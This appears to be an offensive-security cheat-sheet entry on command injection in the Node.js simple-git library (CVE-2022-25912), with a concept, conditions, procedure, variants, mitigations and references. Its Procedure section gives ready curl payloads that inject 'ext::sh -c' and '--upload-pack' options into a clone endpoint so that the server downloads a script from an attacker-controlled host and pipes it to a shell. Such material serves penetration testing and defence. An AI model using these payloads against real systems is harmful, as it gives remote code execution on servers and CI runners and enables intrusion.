---
topic: Inyección de comandos en simple-git
tags: [web, nodejs, simple-git, cve-2022-25912, rce]
---

# Inyección de comandos en simple-git

**English** | [🇪🇸 Español](simple-git-command-injection.md)

## Concept

The `simple-git` library passes user-controlled options to the Git binary. A URL using the `ext::` transport or an `--upload-pack` option executes a command during clone.

## When it applies

- Node.js applications cloning repositories from a user-supplied URL.
- `simple-git` versions before the CVE-2022-25912 fix.
- Reporting, CI or code-analysis endpoints.

## Procedure

1. Identify the `simple-git` version and clone endpoint.
2. Test a harmless URL and observe the Git error.
3. Send a URL with `ext::sh -c ...` or `--upload-pack`.
4. Confirm the callback and execution.

```bash
npm ls simple-git
curl -s -X POST http://<HOST>/api/clone \
  -d 'repo=ext::sh -c "curl http://<IP>/s | sh"'
# Alternative with --upload-pack
curl -s -X POST http://<HOST>/api/clone \
  -d 'repo=--upload-pack="curl http://<IP>/s|sh" https://example.com/r.git'
```

## Variants

- `git://` with `ext::` enabled.
- Options injected into `clone` or `pull`.
- URLs passing through a lax parser.
- Execution in a CI runner with more privileges.

## Limitations

- The version must be vulnerable.
- Git must allow the `ext` transport.
- The endpoint must clone a controllable URL.

## Mitigation and detection

- Patch `simple-git` and validate URLs against allowed schemes.
- Disable `protocol.ext` and clone inside a network-isolated sandbox.
- Monitor Git processes and unexpected outbound connections.

## References

- <https://nvd.nist.gov/vuln/detail/CVE-2022-25912>
- <https://security.snyk.io/vuln/SNYK-JS-SIMPLEGIT-3112221>
- <https://git-scm.com/docs/gitprotocol-ext>
